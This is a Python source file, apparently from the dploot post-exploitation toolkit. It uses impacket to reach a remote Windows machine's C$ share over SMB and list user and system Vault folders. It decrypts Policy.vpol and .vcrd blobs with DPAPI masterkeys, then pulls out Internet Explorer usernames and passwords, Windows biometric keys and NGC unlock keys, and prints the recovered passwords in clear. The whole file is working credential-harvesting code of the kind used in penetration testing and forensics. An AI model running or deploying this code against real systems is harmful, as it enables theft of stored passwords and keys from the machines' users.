import logging
import ntpath
from typing import Any, List
from binascii import hexlify

from impacket.structure import hexdump
from impacket.dcerpc.v5.dtypes import RPC_SID
from impacket.dpapi import VAULT_INTERNET_EXPLORER, VAULT_WIN_BIO_KEY, VAULT_NGC_ACCOOUNT

from dploot.lib.dpapi import decrypt_vcrd, decrypt_vpol, find_masterkey_for_vpol_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_guid
from dploot.triage.masterkeys import Masterkey

class VaultCred:
    def __init__(self, blob, type: VAULT_INTERNET_EXPLORER|VAULT_WIN_BIO_KEY|VAULT_NGC_ACCOOUNT| Any, username: str = None, resource: str = None, password: str = None, sid: str = None, friendly_name: str = None, biometric_key: str = None, unlock_key: str = None, IV: str = None, cipher_text: str = None):
        self.blob = blob
        if type is VAULT_INTERNET_EXPLORER:
            self.type = 'Internet Explorer'
            self.username = username
            self.resource = resource
            self.password = password
        elif type is VAULT_WIN_BIO_KEY:
            self.type = 'WINDOWS BIOMETRIC KEY'
            self.sid = sid
            self.friendly_name = friendly_name
            self.biometric_key = biometric_key
        elif type is VAULT_NGC_ACCOOUNT:
            self.type = 'NGC LOCAL ACCOOUNT'
            self.sid = sid
            self.friendly_name = friendly_name
            self.unlock_key = unlock_key
            self.IV = IV
            self.cipher_text = cipher_text
        else:
            self.type = 'None'
    
    def dump(self) -> None:
        self.blob.dump()
        if self.password is not None:
            print('Decoded Password: %s' % self.password)
            print()

    def dump_quiet(self) -> None:
        if self.type == 'Internet Explorer':
            print("[Internet Explorer] %s - %s:%s" % (self.resource, self.username, self.password))

class VaultsTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_vault_generic_path = [
        'Users\\%s\\AppData\\Local\\Microsoft\\Vault',
        'Users\\%s\\AppData\\Roaming\\Microsoft\\Vault',
    ]
    system_vault_generic_path = [
        "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault",
        "Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault"
    ]
    share = 'C$'
    vpol_filename = 'Policy.vpol'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
        self.target = target
        self.conn = conn
        
        self._users = None
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_system_vaults(self) -> List[VaultCred]:
        vaults_creds = list()
        vault_dirs = self.conn.listDirs(self.share, self.system_vault_generic_path)
        for system_vault_path,system_vault_dir in vault_dirs.items():
            if system_vault_dir is not None:
                vaults_creds += self.triage_vaults_folder(vaults_folder_path=system_vault_path,vaults_folder=system_vault_dir)
        return vaults_creds

    def triage_vaults(self) -> List[VaultCred]:
        vaults_creds = list()
        for user in self.users:
            try:
                vaults_creds += self.triage_vaults_for_user(user) 
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.debug(str(e))
                pass
        return vaults_creds

    def triage_vaults_for_user(self, user:str) -> List[VaultCred]:
        vaults_creds = list()
        vault_dirs = self.conn.listDirs(self.share, [elem % user for elem in self.user_vault_generic_path])
        for user_vault_path,user_vault_dir in vault_dirs.items():
            if user_vault_dir is not None:
                vaults_creds += self.triage_vaults_folder(vaults_folder_path=user_vault_path,vaults_folder=user_vault_dir)
        return vaults_creds

    def triage_vaults_folder(self, vaults_folder_path, vaults_folder) -> List[VaultCred]:
        vaults_creds = list()
        for d in vaults_folder:
            if is_guid(d.get_longname()) and d.is_directory()>0:
                vault_dirname = d.get_longname()
                vault_directory_path = ntpath.join(vaults_folder_path,vault_dirname)
                logging.debug("Found Vault Directory: \\\\%s\\%s\\%s\n" %  (self.target.address,self.share,vault_directory_path))
                
                # read vpol blob
                vpol_filepath = ntpath.join(vault_directory_path,self.vpol_filename)
                vpolblob_bytes = self.conn.readFile(self.share,vpol_filepath)
                vpol_keys = list()
                if vpolblob_bytes is not None and self.masterkeys is not None:
                    self.looted_files[vault_dirname + '_' + self.vpol_filename] = vpolblob_bytes    
                    masterkey = find_masterkey_for_vpol_blob(vpolblob_bytes, self.masterkeys)
                    if masterkey is not None:
                        vpol_decrypted = decrypt_vpol(vpolblob_bytes,masterkey)
                        if vpol_decrypted['Key1']['Size'] > 0x24:
                            vpol_keys.append(
                                hexlify(vpol_decrypted['Key2']['bKeyBlob']))
                            vpol_keys.append(
                                hexlify(vpol_decrypted['Key1']['bKeyBlob']))
                        else:
                            vpol_keys.append(
                                hexlify(
                                    vpol_decrypted['Key2']['bKeyBlob']['bKey']).decode('latin-1'))
                            vpol_keys.append(
                                hexlify(
                                    vpol_decrypted['Key1']['bKeyBlob']['bKey']).decode('latin-1'))
                    else:
                        logging.debug("Could not decrypt...")

                # read vrcd blob
                vault_dir = self.conn.remote_list_dir(self.share, vault_directory_path)
                for file in vault_dir:
                    filename = file.get_longname()
                    if filename != self.vpol_filename and filename not in self.false_positive and file.is_directory() == 0 and filename[-4:] == 'vcrd':
                        vrcd_filepath = ntpath.join(vault_directory_path,filename)
                        vrcd_bytes = self.conn.readFile(self.share, vrcd_filepath)
                        self.looted_files[vault_dirname + '_' + vrcd_filepath] = vpolblob_bytes  
                        if vrcd_bytes is not None and filename[-4:] in ['vsch','vcrd'] and len(vpol_keys) > 0:
                            vault = decrypt_vcrd(vrcd_bytes, vpol_keys)
                            if isinstance(vault, (VAULT_INTERNET_EXPLORER, VAULT_WIN_BIO_KEY, VAULT_NGC_ACCOOUNT)):
                                if isinstance(vault, VAULT_INTERNET_EXPLORER):
                                    vaults_creds.append(VaultCred(blob=vault, type=type(vault), username=vault['Username'].decode('utf-16le'),resource=vault['Resource'].decode('utf-16le'), password=vault['Password'].decode('utf-16le') ))
                                elif isinstance(vault, VAULT_WIN_BIO_KEY):
                                    vaults_creds.append(VaultCred(blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1')))
                                elif isinstance(vault, VAULT_NGC_ACCOOUNT):
                                    vaults_creds.append(VaultCred(blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1'), unlock_key=hexlify(vault["UnlockKey"]), IV=hexlify(vault["IV"]), cipher_text=hexlify(vault["CipherText"])))
                            else:
                                logging.debug('Vault decrypted but unknown data structure:')
        return vaults_creds

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users